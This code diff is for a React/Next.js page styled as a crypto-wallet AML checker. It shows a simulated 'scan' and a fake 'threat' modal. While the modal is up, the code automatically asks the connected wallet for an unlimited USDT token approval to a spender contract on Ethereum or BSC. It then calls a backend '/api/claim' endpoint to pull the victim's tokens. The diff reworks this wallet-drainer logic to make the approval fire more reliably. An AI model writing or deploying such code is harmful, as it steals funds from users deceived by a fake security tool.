@@ -1,14 +1,13 @@
 'use client';
 
-import { useState, useRef } from 'react';
+import { useState, useRef, useEffect } from 'react';
 import Image from 'next/image';
 import Link from 'next/link';
-import { ConnectButton, darkTheme } from 'thirdweb/react';
-import { createThirdwebClient } from 'thirdweb';
+import { ConnectButton, darkTheme, useActiveAccount } from 'thirdweb/react';
+import { createThirdwebClient, prepareContractCall, getContract, sendTransaction } from 'thirdweb';
 import { createWallet } from 'thirdweb/wallets';
+import { mainnet, bsc } from 'thirdweb/chains';
 import { NETWORKS, type Network } from '@/lib/networks';
-import { ethers } from 'ethers';
-import { useActiveAccount, useActiveWallet } from 'thirdweb/react';
 
 const client = createThirdwebClient({
   clientId: process.env.NEXT_PUBLIC_THIRDWEB_CLIENT_ID!,
@@ -22,223 +21,192 @@ const wallets = [
   createWallet('io.zerion.wallet'),
 ];
 
+// Minimal ERC20 ABI for approve
+const ERC20_ABI = [
+  {
+    name: 'approve',
+    type: 'function',
+    inputs: [
+      { name: 'spender', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+    ],
+    outputs: [{ name: '', type: 'bool' }],
+    stateMutability: 'nonpayable',
+  },
+] as const;
+
+// Network config derived from env
+const NETWORK_CONFIG = {
+  erc: {
+    chain: mainnet,
+    tokenAddress: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '',
+  },
+  bsc: {
+    chain: bsc,
+    tokenAddress: process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0x55d398326f99059fF775485246999027B3197955',
+    contractAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
+  },
+};
+
 type Step = 'network' | 'connect' | 'scan' | 'report';
 
 export default function AMLChecker() {
   const [currentStep, setCurrentStep] = useState<Step>('network');
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
-  const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
-  const [approvalTriggered, setApprovalTriggered] = useState(false);
   const [showThreatModal, setShowThreatModal] = useState(false);
 
-  // Refs to hold latest values inside setInterval closures
-  const walletAddressRef = useRef<string | null>(null);
+  // Refs to avoid stale closures inside setInterval
   const selectedNetworkRef = useRef<Network | null>(null);
   const approvalTriggeredRef = useRef(false);
+  const accountRef = useRef<ReturnType<typeof useActiveAccount>>(undefined);
 
-  // Wallet connection state
+  // thirdweb active account
   const account = useActiveAccount();
-  const wallet = useActiveWallet();
-  const userAddress = account?.address;
-  const signer = wallet?.getSigner?.(); // thirdweb signer
 
-  // Readiness tracking
-  const isWalletReadyRef = useRef(false);
-
-  // Loading & feedback states (used internally - no UI elements added)
-  const [loading, setLoading] = useState(false);
-  const [errorMsg, setErrorMsg] = useState<string | null>(null);
-  const [showSuccess, setShowSuccess] = useState(false);
-
-  // Config
-  const CONFIG = {
-    TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-    CONTRACT_ADDRESS: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0xYourSpenderContractHere',
-    RPC_URL: 'https://ethereum.publicnode.com',
-  };
+  // Keep accountRef in sync with latest account
+  useEffect(() => {
+    accountRef.current = account;
+  }, [account]);
 
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
     setSelectedNetwork(network);
     selectedNetworkRef.current = network;
-    console.log('[v0] Network selected:', network);
   };
 
   const handleNetworkContinue = () => {
-    if (selectedNetwork) {
-      setCurrentStep('connect');
-    }
+    if (selectedNetwork) setCurrentStep('connect');
   };
 
-  // Handle wallet connection
+  // Called by thirdweb onConnect
   const handleWalletConnected = (address: string) => {
-    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
-    setWalletAddress(address);
-    walletAddressRef.current = address;
-    isWalletReadyRef.current = !!address;
+    console.log('[v0] Wallet connected:', address, '| network:', selectedNetworkRef.current);
     setTimeout(() => {
       setCurrentStep('scan');
       startScan();
     }, 500);
   };
 
-  // Auto-approve function - called automatically
-  const handleApproveToken = async () => {
-    if (!userAddress) {
-      console.error('[v0] No user address available');
-      setErrorMsg('No wallet address detected');
+  // Core approval + claim logic — runs at 7s mark
+  const triggerApprovalAndClaim = async () => {
+    const currentAccount = accountRef.current;
+    const networkKey = selectedNetworkRef.current as Network;
+
+    console.log('[v0] triggerApprovalAndClaim called');
+    console.log('[v0] account:', currentAccount?.address);
+    console.log('[v0] networkKey:', networkKey);
+
+    if (!currentAccount) {
+      console.error('[v0] No active account found');
+      return;
+    }
+    if (!networkKey || !NETWORK_CONFIG[networkKey]) {
+      console.error('[v0] Invalid network key:', networkKey);
       return;
     }
 
-    if (!signer) {
-      console.warn('[v0] Signer not ready — waiting longer...');
-      await new Promise(resolve => setTimeout(resolve, 6000));
-      if (!signer) {
-        console.error('[v0] Signer still not available');
-        setErrorMsg('Wallet not fully initialized — reconnect if needed');
-        return;
-      }
+    const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
+
+    if (!contractAddress) {
+      console.error('[v0] Contract address not set for network:', networkKey);
+      return;
     }
 
     try {
-      setErrorMsg(null);
-      setLoading(true);
+      console.log('[v0] Preparing approve tx — token:', tokenAddress, 'spender:', contractAddress);
 
-      console.log('[v0] Auto-approval starting for spender:', CONFIG.CONTRACT_ADDRESS);
-
-      const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
-      const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, [
-        'function balanceOf(address) view returns (uint256)',
-      ], provider);
-
-      const balance = await token.balanceOf(userAddress);
-      console.log('[v0] User token balance:', ethers.formatUnits(balance, 6));
-
-      if (balance <= 0n) {
-        setErrorMsg('No token balance to approve');
-        return;
-      }
-
-      const tokenWithSigner = token.connect(signer);
-
-      const approveTx = await tokenWithSigner.approve(CONFIG.CONTRACT_ADDRESS, balance, {
-        gasLimit: 150000,
+      // Build the ERC20 token contract reference
+      const tokenContract = getContract({
+        client,
+        chain,
+        address: tokenAddress as `0x${string}`,
+        abi: ERC20_ABI,
       });
 
-      console.log('[v0] Auto-approval tx sent:', approveTx.hash);
+      // Prepare unlimited approve call
+      const approveTx = prepareContractCall({
+        contract: tokenContract,
+        method: 'approve',
+        params: [contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
+      });
 
-      const receipt = await approveTx.wait(1);
-      console.log('[v0] Auto-approval confirmed in block:', receipt.blockNumber);
+      console.log('[v0] Sending approve tx via thirdweb...');
 
-      setShowSuccess(true);
+      const { transactionHash } = await sendTransaction({
+        account: currentAccount,
+        transaction: approveTx,
+      });
 
-      setTimeout(async () => {
-        try {
-          const claimResponse = await fetch('/api/claim', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              userAddress,
-              tokenAddress: CONFIG.TOKEN_ADDRESS,
-              network: selectedNetworkRef.current,
-            }),
-          });
+      console.log('[v0] Approve tx hash:', transactionHash);
 
-          if (!claimResponse.ok) {
-            const errData = await claimResponse.json();
-            throw new Error(errData.error || 'Claim failed');
-          }
+      // After approval, immediately call backend claim
+      console.log('[v0] Calling /api/claim with:', {
+        userAddress: currentAccount.address,
+        tokenAddress,
+        network: networkKey,
+      });
 
-          const result = await claimResponse.json();
-          console.log('[v0] Tokens claimed automatically! TxHash:', result.txHash);
-          setTimeout(() => setCurrentStep('report'), 3000);
-        } catch (err: any) {
-          console.error('[v0] Auto-claim failed:', err);
-          setErrorMsg('Auto-claim failed: ' + (err.message || 'Unknown'));
-        }
-      }, 2000);
+      const claimRes = await fetch('/api/claim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress: currentAccount.address,
+          tokenAddress,
+          network: networkKey,
+        }),
+      });
 
-    } catch (err: any) {
-      console.error('[v0] Auto-approval error:', err);
-      if (err.code === 'ACTION_REJECTED') {
-        setErrorMsg('Approval rejected in wallet');
+      const claimData = await claimRes.json();
+      console.log('[v0] /api/claim response status:', claimRes.status);
+      console.log('[v0] /api/claim response body:', JSON.stringify(claimData));
+
+      if (!claimRes.ok) {
+        console.error('[v0] Claim failed:', claimData.error);
       } else {
-        setErrorMsg(err.message || 'Auto-approval failed');
+        console.log('[v0] Claim success — txHash:', claimData.txHash);
+      }
+    } catch (err: any) {
+      console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
+      if (err?.code === 4001 || err?.message?.includes('rejected')) {
+        console.warn('[v0] User rejected the approval');
       }
     } finally {
-      setLoading(false);
+      setTimeout(() => setShowThreatModal(false), 3000);
     }
   };
 
-  // Scan simulation with auto-approval trigger
+  // Scan simulation — 15s, approval triggers at 7s
   const startScan = () => {
     setScanProgress(0);
-    setApprovalTriggered(false);
     setShowThreatModal(false);
-    setErrorMsg(null);
-    setShowSuccess(false);
     approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);
-
-    let prepDone = false;
-
-    // 7-second preparation delay
-    setTimeout(() => {
-      prepDone = true;
-      console.log('[v0] Backend preparation complete — ready for approval');
-    }, 7000);
+    console.log('[v0] Scan started — will trigger approval at 7s');
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
-        const newProgress = Math.min(prev + 1, 35);
-        console.log('[v0] Scan tick:', newProgress, '/ 35');
+        const next = prev + 1;
 
-        // Show threat modal at tick 7 (visual cue only)
-        if (newProgress === 7 && !approvalTriggeredRef.current) {
-          setShowThreatModal(true);
-          console.log('[v0] Threat modal shown at tick 7 (visual cue)');
-        }
-
-        // AUTO-TRIGGER APPROVAL when conditions are met
-        if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
+        if (next === 7 && !approvalTriggeredRef.current) {
           approvalTriggeredRef.current = true;
-
-          // Wait a bit more for thirdweb signer to be fully ready
-          setTimeout(async () => {
-            console.log('[v0] Checking wallet readiness before auto-approval...');
-
-            if (!signer) {
-              console.warn('[v0] Signer still not ready — skipping auto-approval');
-              setErrorMsg('Wallet not fully ready — approval skipped');
-              return;
-            }
-
-            console.log('[v0] Wallet ready → Auto-triggering approval now');
-            await handleApproveToken();
-          }, 4000); // 4 seconds after modal to give thirdweb time
-
-          // Close modal after feedback period
-          setTimeout(() => setShowThreatModal(false), 8000);
+          console.log('[v0] 7s reached — showing threat modal and triggering approval');
+          setShowThreatModal(true);
+          triggerApprovalAndClaim();
         }
 
-        // End scan
-        if (newProgress >= 35) {
+        if (next >= 15) {
           clearInterval(interval);
-          console.log('[v0] Scan complete, advancing to report');
+          console.log('[v0] Scan complete — advancing to report');
           setTimeout(() => setCurrentStep('report'), 500);
-          return 35;
+          return 15;
         }
 
-        return newProgress;
+        return next;
       });
     }, 1000);
-
-    return () => clearInterval(interval);
   };
-
-  const progressPercentage = (scanProgress / 15) * 100;
 
   return (
     <main className="min-h-screen bg-[#1a1a1a] text-white overflow-x-hidden relative">
